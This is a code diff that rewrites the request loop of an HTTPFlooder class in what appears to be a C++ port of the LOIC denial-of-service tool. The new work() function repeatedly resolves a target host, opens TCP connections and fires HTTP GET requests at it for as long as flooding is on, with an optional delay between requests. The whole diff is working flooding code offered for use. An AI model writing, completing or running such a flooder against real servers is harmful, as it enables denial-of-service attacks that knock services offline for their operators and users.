@@ -7,123 +7,126 @@
 
 
 #include "HTTPFlooder.h"
-
+#include <sys/types.h>
+#include <netdb.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#define BUF_SIZE 64
 namespace loic {
 
-	void HTTPFlooder::work()
+void HTTPFlooder::work()
+{
+	hostname = false;
+	struct addrinfo hints;
+	struct addrinfo *result, *rp;
+	int sfd, s;
+	size_t len;
+	ssize_t nread;
+	char buffer[BUF_SIZE];
+	memset(&hints, 0, sizeof(struct addrinfo));
+	hints.ai_family = AF_INET;    /* Allow IPv4 or IPv6 */
+	hints.ai_socktype = SOCK_STREAM; /* Datagram socket */
+	hints.ai_flags = 0;
+	hints.ai_protocol = 0;          /* Any protocol */
+
+	try
 	{
-		try
+		int i = 0;
+		while(this->isFlooding())
 		{
-			int i = 0;
-			while(this->isFlooding())
-			{
-				this->state = readyState;
-				//tick
-				lastAction = time(NULL)/3600;
+			this->state = readyState;
+			//tick
+			lastAction = time(NULL)/3600;
 
-				int socketHandle;
-				if((socketHandle = socket(AF_INET,SOCK_STREAM,IPPROTO_IP)<0)){
+			fprintf(stdout,"getting address\n");
+			s = getaddrinfo(ip.c_str(),port.c_str(), &hints, &result);
+			if (s != 0) {
+				fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(s));
+				continue;
+			}
 
-					close(socketHandle);
-					std::cerr<<i<<" couldn't create socket socket"<<std::endl;
+
+			for (rp = result; rp != NULL; rp = rp->ai_next) {
+				sfd = socket(rp->ai_family, rp->ai_socktype,rp->ai_protocol);
+
+				if (sfd == -1)
+					continue;
+
+				if (connect(sfd, rp->ai_addr, rp->ai_addrlen) != -1)
+				{
+					this->state = requestingState;
+					std::cout<<"successfully connect\n";
+					break;                  /* Success */
 				}
 
-				this->state = connectingState;
+				close(sfd);
+			}
 
-				fcntl(socketHandle,F_SETFL,O_NONBLOCK);
+            int val = fcntl(sfd, F_GETFL, 0);
+           // fcntl(sfd, F_SETFL, val | O_NONBLOCK);
+			if (rp == NULL) {               /* No address succeeded */
+				fprintf(stderr, "Could not connect\n");
+				continue;
+			}
 
+			freeaddrinfo(result);
 
-				/* socket work */
+			this->state = connectingState;
 
-				struct sockaddr_in remoteSocketInfo;
+			std::cout<<"sending"<<std::endl;
 
-				std::string remoteHost = "from the ip address";
+			std::stringstream stream("");
+			stream<<"GET /"<<this->subsite<<" HTTP/1.1\r\n\r\n";
+			char buf[stream.str().length()];
+			strcpy(buf,stream.str().c_str());
 
-				bzero(&remoteSocketInfo, sizeof(sockaddr_in)); //clear memory
+			len = strlen(buf) + 1;
+			/* +1 for terminating null byte */
 
+			if (write(sfd, buf, len) != len)
+			{
+				std::cerr<<"partial/failed write"<<std::endl;
+				continue;
+			}
 
-				//using hostname
-				if(hostname)
-				{
-					struct hostent *hPtr;
-					if((hPtr = gethostbyname(remoteHost.c_str())) == NULL)
-					{
-						std::cerr<<i<<" System DNS name resolution not configured properly."<<std::endl;
-						std::cerr<<i<<" Error number: "<< ECONNREFUSED<<std::endl;
+			this->state = downloadingState;
+			requested++;
 
-					}
-
-					//Load system information for remote socket server into socket data structure
-					memcpy((char*) & remoteSocketInfo.sin_addr, hPtr->h_addr,hPtr->h_length);
+			std::cout<<"receiving..."<<std::endl;
+			if(resp)
+			{
+				nread = read(sfd, buffer, BUF_SIZE);
+				if (nread == -1) {
+					perror("read");
+					exit(EXIT_FAILURE);
 				}
 				else
 				{
-					//using ip address
-					remoteSocketInfo.sin_addr.s_addr = inet_addr(ip.c_str());
+					std::cout<<errno<<std::endl;;
 				}
-
-				remoteSocketInfo.sin_family = AF_INET;
-				remoteSocketInfo.sin_port = htons((u_short)port);
-				if((connect(socketHandle, (struct sockaddr *)&remoteSocketInfo, sizeof(sockaddr_in)))<0)
-				{
-					close(socketHandle);
-					std::cerr<<i<<" could not connect socket\n";
-
-				}
-
-				this->state = requestingState;
-
-				//socket send
-				char buf[512];
-				std::stringstream stream("");
-				stream<<"GET /"<<this->subsite<<" HTTP/1.0\n\n\n";
-				strcpy(buf,stream.str().c_str());
-				send(socketHandle,buf,strlen(buf)+1,0);
-
-
-				this->state = downloadingState;
-				requested++;
-
-				if(resp)
-				{
-					//socket receive
-					char recvBuf[64];
-					int rc  = recv(socketHandle, &recvBuf, 64,0);  //0 for no flags
-					if(rc == 0)
-					{
-						std::cerr<<i<<" ERROR! Socket closed"<<std::endl;
-					}
-					else if(rc == -1)
-					{
-						std::cerr<<i<<" ERROR! Socket error"<<std::endl;
-						close(socketHandle);
-					}
-					else
-					{
-						//successfull
-						std::cout<<recvBuf<<std::endl;
-
-					}
-
-				}
-
-				this->state = completedState;
-				downloaded++;
-
-
-				if(delay>0)
-				{
-					boost::this_thread::sleep(boost::posix_time::milliseconds(delay));
-				}
-				i++;
+				std::cout<<"Received "<<nread<<" bytes: "<<buffer<<std::endl;
 			}
+
+			this->state = completedState;
+			downloaded++;
+
+			if(delay>0)
+			{
+				boost::this_thread::sleep(boost::posix_time::milliseconds(delay));
+			}
+			std::cout<<"finished "<<i++<<std::endl;
+
 		}
-		catch(std::exception & exe)
-		{
-			std::cerr<<exe.what()<<std::endl;
-		}
-		flooding = false;
 	}
+	catch(std::exception & exe)
+	{
+		std::cerr<<exe.what()<<std::endl;
+		std::cout<<"caught an exception"<<std::endl;
+	}
+	flooding = false;
+
+}
 
 	void HTTPFlooder::checkTimeOut()
 	{
